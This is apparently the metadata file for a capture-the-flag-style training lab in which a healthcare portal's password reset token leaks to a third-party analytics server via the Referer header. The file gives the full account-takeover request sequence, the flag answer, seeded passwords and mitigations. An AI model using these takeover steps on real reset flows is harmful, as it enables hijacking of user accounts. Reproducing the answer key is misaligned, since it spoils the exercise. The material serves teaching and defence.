// src/modules/practice-labs/broken-auth/labs/lab3/lab3.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const brokenAuthLab3Metadata: LabMetadata = {
  slug: 'broken-auth-reset-token-referer-leak-healthcare',
  canonicalConceptId: 'broken-auth-token-url-exposure',
  environmentType: 'HEALTHCARE_PORTAL',
  title: 'Broken Auth: Password Reset Token Leak via Referer Header — Healthcare Portal',
  ar_title: 'Broken Auth: تسريب توكن إعادة التعيين عبر Referer — البوابة الصحية',
  description:
    'Exploit a broken authentication vulnerability in a healthcare portal where the password reset token is included in the URL as a query parameter. When the user clicks a reset link, the token leaks via the HTTP Referer header to a third-party analytics server.',
  ar_description:
    'استغل ثغرة مصادقة مكسورة في بوابة صحية حيث يتضمّن URL توكن إعادة تعيين كلمة المرور كمعامل استعلام. يتسرّب التوكن عبر Referer header إلى خادم تحليلات خارجي.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: ['Broken Authentication', 'Token Leakage', 'Referer Header Attack', 'Password Reset Flaws', 'Information Disclosure'],
  xpReward: 260,
  pointsReward: 130,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  missionBrief: {
    codename: 'OPERATION LEAKY HEADER',
    classification: 'SECRET',
    objective: {
      en: 'Intercept the password reset token for doctor@medicare.io by reading the Referer header logged by the third-party analytics server, then use it to take over the doctor account.',
      ar: 'التقط توكن إعادة تعيين كلمة مرور لـ doctor@medicare.io من خلال قراءة Referer header المسجّل بواسطة خادم التحليلات، ثم استخدمه للاستيلاء على حساب الطبيب.',
    },
    successCriteria: {
      en: 'Login as doctor@medicare.io after resetting their password using the leaked token.',
      ar: 'سجّل الدخول كـ doctor@medicare.io بعد إعادة تعيين كلمة مرورهم باستخدام التوكن المسرَّب.',
    },
  },

  labInfo: {
    vulnType: 'Broken Authentication — Reset Token URL Exposure via Referer',
    cweId: 'CWE-598',
    cvssScore: 7.4,
    whatYouLearn: {
      en: [
        'Why putting secrets in URLs is fundamentally unsafe (Referer, browser history, server logs)',
        'How third-party scripts silently exfiltrate URL-embedded secrets via Referer header',
        'POST-redirect pattern: correct password reset flow design',
        'Mitigation: Referrer-Policy header + no external scripts on sensitive pages',
      ],
      ar: [
        'لماذا وضع الأسرار في URLs غير آمن جوهرياً (Referer، تاريخ المتصفح، سجلات الخادم)',
        'كيف تسرّب السكريبتات الخارجية الأسرار المضمَّنة في URL عبر Referer header',
        'نمط POST-redirect: تصميم تدفق إعادة تعيين كلمة المرور الصحيح',
        'التخفيف: Referrer-Policy header + لا سكريبتات خارجية على صفحات حساسة',
      ],
    },
    techStack: ['REST API', 'Node.js', 'HTTP Headers', 'Password Reset Flow'],
    references: [
      'https://owasp.org/www-community/attacks/Forgot_Password_Cheat_Sheet',
      'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy',
      'https://cwe.mitre.org/data/definitions/598.html',
    ],
  },

  goal: "The doctor's reset link is /reset-password?token=<SECRET>. The reset page loads an external analytics script. Intercept the token via the Referer header, then use it to reset the doctor's password.",
  ar_goal:
    'رابط إعادة التعيين هو /reset-password?token=<SECRET>. تحمّل صفحة إعادة التعيين سكريبت تحليلات خارجياً. التقط التوكن عبر Referer header، ثم استخدمه لإعادة تعيين كلمة مرور الطبيب.',

  briefing: {
    en: `MediCare — patient portal. Medical records, appointments, prescriptions.
doctor@medicare.io forgot their password.
Reset link sent: https://medicare.io/reset-password?token=a1b2c3d4e5f6...
They click the link. The page loads.
In the HTML: <script src="https://analytics.thirdparty.io/track.js">
Browser fires GET to analytics.thirdparty.io.
In that request: Referer: https://medicare.io/reset-password?token=a1b2c3d4e5f6...
The analytics server now has the reset token.
In its logs. Forever.
You can read those logs.
The token is yours.`,
    ar: `MediCare — بوابة مرضى. سجلات طبية، مواعيد، وصفات.
نسي doctor@medicare.io كلمة مروره.
رابط إعادة التعيين: https://medicare.io/reset-password?token=a1b2c3d4e5f6...
ينقر عليه. تتحمّل الصفحة.
في HTML: <script src="https://analytics.thirdparty.io/track.js">
المتصفح يرسل GET لـ analytics.thirdparty.io.
في ذلك الطلب: Referer: https://medicare.io/reset-password?token=a1b2c3d4e5f6...
خادم التحليلات لديه التوكن. في سجلاته. إلى الأبد.
تستطيع قراءة تلك السجلات.
التوكن ملكك.`,
  },

  stepsOverview: {
    en: [
      'POST /auth/request-reset { "email": "doctor@medicare.io" } — trigger reset',
      'Understand: reset URL has token as query param, page loads external analytics script',
      'POST /auth/simulate-page-visit — browser fires GET to analytics with Referer containing token',
      'GET /analytics/logs — find Referer entry with embedded token',
      'POST /auth/do-reset { "token": "<leaked>", "newPassword": "hacked!" }',
      'Login as doctor@medicare.io → flag',
    ],
    ar: [
      'POST /auth/request-reset { "email": "doctor@medicare.io" } — شغّل إعادة التعيين',
      'افهم: URL يحتوي التوكن كمعامل استعلام، الصفحة تحمّل سكريبت تحليلات خارجياً',
      'POST /auth/simulate-page-visit — المتصفح يرسل GET للتحليلات مع Referer يحتوي التوكن',
      'GET /analytics/logs — ابحث عن Referer مع التوكن المضمَّن',
      'POST /auth/do-reset { "token": "<leaked>"، "newPassword": "hacked!" }',
      'دخول كـ doctor@medicare.io → العلم',
    ],
  },

  solution: {
    context:
      'MediCare embeds the reset token in URL as query param. The reset page loads a third-party analytics script which causes the browser to send the full URL (including token) in the Referer header of the script load request.',
    vulnerableCode:
      '// Reset email sends: https://medicare.io/reset-password?token=RESET_TOKEN\n' +
      '// ❌ Token in URL = leaks in Referer, browser history, server logs\n\n' +
      '// Reset page HTML:\n' +
      '<!-- ❌ Third-party script receives full URL in Referer! -->\n' +
      '<script src="https://analytics.thirdparty.io/track.js"></script>',
    exploitation:
      '1. POST /auth/request-reset { "email": "doctor@medicare.io" }\n' +
      '2. POST /auth/simulate-page-visit\n' +
      '3. GET /analytics/logs → find token in Referer\n' +
      '4. POST /auth/do-reset { "token": "<SECRET>", "newPassword": "hacked!" }\n' +
      '5. Login as doctor → flag',
    steps: {
      en: [
        'POST /auth/request-reset { "email": "doctor@medicare.io" }',
        'POST /auth/simulate-page-visit → analytics request fires with Referer',
        'GET /analytics/logs → { "referer": "https://medicare.io/reset-password?token=abc123secret" }',
        'Extract token: "abc123secret"',
        'POST /auth/do-reset { "token": "abc123secret", "newPassword": "h4cked123!" } → 200 OK',
        'POST /auth/login { "email": "doctor@medicare.io", "password": "h4cked123!" } → FLAG{BROKEN_AUTH_RESET_TOKEN_URL_REFERER_LEAK_HEALTHCARE}',
      ],
      ar: [
        'POST /auth/request-reset { "email": "doctor@medicare.io" }',
        'POST /auth/simulate-page-visit → يتشغّل طلب التحليلات مع Referer',
        'GET /analytics/logs → { "referer": "https://medicare.io/reset-password?token=abc123secret" }',
        'استخرج التوكن: "abc123secret"',
        'POST /auth/do-reset { "token": "abc123secret"، "newPassword": "h4cked123!" } → 200 OK',
        'POST /auth/login { "email": "doctor@medicare.io"، "password": "h4cked123!" } → FLAG{BROKEN_AUTH_RESET_TOKEN_URL_REFERER_LEAK_HEALTHCARE}',
      ],
    },
    fix: [
      'Tokens in POST body only: never put sensitive tokens in URLs',
      'Referrer-Policy: no-referrer on reset pages',
      'No external scripts on sensitive pages (reset, payment, MFA)',
      'Short token validity: 15-30 minutes max',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Browsers automatically include the full URL in the Referer header of any outgoing request. Putting a secret token in the URL is fundamentally unsafe: observable by browser history, server logs, CDN logs, analytics, and any third-party resource on the page.',
      ar: 'تُضمّن المتصفحات تلقائياً URL الكامل في Referer header لأي طلب صادر. وضع توكن سري في URL غير آمن جوهرياً.',
    },
    impact: {
      en: 'Healthcare account takeover: patient medical records, prescriptions, personal health data — all under HIPAA/GDPR. Token leaked silently with zero extra interaction.',
      ar: 'استيلاء على حساب صحي: سجلات طبية، وصفات، بيانات صحية شخصية محمية بـ HIPAA/GDPR.',
    },
    fix: [
      'POST-redirect pattern: reset link → landing page → POST token in body',
      'Referrer-Policy: no-referrer on reset pages',
      'No external resources on security-critical pages',
      'Short token validity: 15-30 minutes',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      ar_content: 'شغّل إعادة تعيين كلمة مرور لـ doctor@medicare.io عبر POST /auth/request-reset. تنسيق رابط إعادة التعيين: /reset-password?token=<SECRET>. التوكن في URL كمعامل استعلام.',
      content: 'Trigger a password reset for doctor@medicare.io via POST /auth/request-reset. Reset link format is /reset-password?token=<SECRET>. The token is in the URL as a query parameter.',
    },
    {
      order: 2,
      xpCost: 30,
      ar_content: 'صفحة إعادة التعيين تحمّل سكريبت تحليلات خارجيًا. عند تحميل المتصفح ذلك السكريبت، يرسل URL الصفحة الكامل في Referer header. استدعِ /auth/simulate-page-visit لمحاكاة ذلك.',
      content: 'The reset page loads an external analytics script. When the browser loads it, it sends the full page URL in the Referer header. Call /auth/simulate-page-visit to simulate this.',
    },
    {
      order: 3,
      xpCost: 55,
      ar_content: 'بعد محاكاة الزيارة، GET /analytics/logs. ابحث عن مدخل Referer يحتوي URL إعادة التعيين الكامل بما فيه التوكن. استخرج قيمة التوكن.',
      content: 'After simulating page visit, GET /analytics/logs. Find the Referer entry containing the full reset URL with the token. Extract the token value.',
    },
    {
      order: 4,
      xpCost: 75,
      ar_content: 'POST /auth/do-reset { "token": "<extracted_token>"، "newPassword": "hacked!" }. ثم سجّل الدخول كـ doctor@medicare.io للحصول على العلم.',
      content: 'POST /auth/do-reset { "token": "<extracted_token>", "newPassword": "hacked!" }. Then login as doctor@medicare.io to get the flag.',
    },
  ],

  flagAnswer: 'FLAG{BROKEN_AUTH_RESET_TOKEN_URL_REFERER_LEAK_HEALTHCARE}',
  initialState: {
    users: [
      { username: 'doctor_hassan', password: 'Doc_H4ss4n_2024!', role: 'doctor', email: 'doctor@medicare.io' },
      { username: 'patient_sara', password: 'sara123', role: 'patient', email: 'sara@medicare.io' },
    ],
  },
};
